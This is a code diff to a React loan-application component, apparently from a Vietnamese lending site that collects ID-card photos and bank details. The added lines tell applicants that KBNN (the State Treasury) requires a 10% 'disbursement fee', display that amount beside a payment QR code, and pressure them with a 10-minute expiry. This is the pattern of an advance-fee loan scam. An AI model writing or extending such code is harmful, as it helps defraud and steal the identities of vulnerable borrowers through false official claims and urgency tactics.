@@ -8,6 +8,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     const [token, setToken] = useState(new URLSearchParams(window.location.search).get('token') || '');
     const [loading, setLoading] = useState(false);
     const [qrUrl, setQrUrl] = useState('');
+    const [amount, setAmount] = useState('');
     const [fileFront, setFileFront] = useState(null);
     const [fileBack, setFileBack] = useState(null);
     const [previewFront, setPreviewFront] = useState(null);
@@ -21,7 +22,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     useEffect(() => {
         if (token) {
             checkStatus(token);
-            const interval = setInterval(() => checkStatus(token), 10000);
+            const interval = setInterval(() => checkStatus(token), 5000);
             return () => clearInterval(interval);
         }
     }, [token]);
@@ -46,6 +47,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
         try {
             const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
             const data = res.data;
+            if (data.amount) setAmount(data.amount);
             if (data.status === 'pending') setState('pending');
             else if (data.status === 'approved') setState('approved');
             else if (data.status === 'waiting_qr') setState('waiting_qr');
@@ -546,6 +548,9 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                         <label>Số tài khoản <span style={{ color: 'red' }}>*</span></label>
                         <input type="text" name="bankAccount" placeholder="Nhập số tài khoản" required />
                     </div>
+                    <div style={{ marginTop: '15px', padding: '15px', background: '#fff5f5', borderRadius: '8px', border: '1px solid #fed7d7', color: '#c53030', fontSize: '14px' }}>
+                        <b>Lưu ý:</b> Theo quy định của KBNN, Quý khách vui lòng chuẩn bị chi phí giải ngân tương đương <b>10%</b> của số tiền vay để hoàn tất thủ tục.
+                    </div>
                     <div style={{ textAlign: 'center', marginTop: '30px' }}>
                         <button type="submit" className="btn-submit" disabled={loading}>
                             {loading ? 'Đang xác nhận...' : 'Xác nhận'}
@@ -564,6 +569,14 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                     Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
                     Vui lòng không đóng trang này.
                 </p>
+                {amount && (
+                    <div style={{ marginTop: '20px', padding: '15px', background: '#f8faff', borderRadius: '8px', border: '1px solid #e1e4e8' }}>
+                        <p style={{ margin: 0, color: '#2c3e50', fontSize: '15px' }}>
+                            Số tiền cần chuyển khoản (phí giải ngân 10%): <br />
+                            <b style={{ color: '#d32f2f', fontSize: '18px' }}>{(parseInt(amount) * 0.1).toLocaleString('vi-VN')} VNĐ</b>
+                        </p>
+                    </div>
+                )}
             </div>
         );
     }
@@ -575,7 +588,15 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                     <div style={{ marginBottom: '20px', textAlign: 'center' }}>
                         <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Nhận mã QR giải ngân</div>
                         <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
-                        <p style={{ color: '#666', fontSize: '13px', marginTop: '10px' }}>Quét mã QR để hoàn tất quá trình nhận tiền từ KBNN</p>
+                        {amount && (
+                            <div style={{ marginTop: '15px', color: '#d32f2f', fontWeight: 'bold', fontSize: '18px' }}>
+                                Số tiền chuyển khoản: {(parseInt(amount) * 0.1).toLocaleString('vi-VN')} VNĐ
+                            </div>
+                        )}
+                        <p style={{ fontSize: '14px', marginTop: '10px', fontWeight: 'bold', color: '#ff4d4f' }}>
+                            ⚠️ Mã QR có hiệu lực trong vòng 10 phút
+                        </p>
+                        <p style={{ color: '#666', fontSize: '13px', marginTop: '5px' }}>Quét mã QR để hoàn tất quá trình nhận tiền từ KBNN</p>
                     </div>
                 )}
                 {!qrUrl && (
